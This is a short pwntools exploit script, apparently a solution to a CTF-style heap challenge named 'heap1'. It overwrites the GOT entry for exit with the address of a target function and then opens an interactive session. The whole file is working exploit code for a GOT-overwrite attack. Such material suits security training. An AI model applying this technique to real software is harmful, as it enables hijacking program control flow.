#!/usr/bin/env python

from pwn import *

context.arch='amd64'

r = process('./heap1')

got_exit = 0x601058
func_goal = 0x4007b6

r.recvuntil('rsize: ')
r.send('200\n')                 # same size should be good
print r.recvuntil('\n')

r.send(p64(got_exit) + '\n')    # send for fgets(r, rsize, stdin)

r.send('0 %ld\n' % (func_goal))

r.send('-1 0\n')

r.interactive()
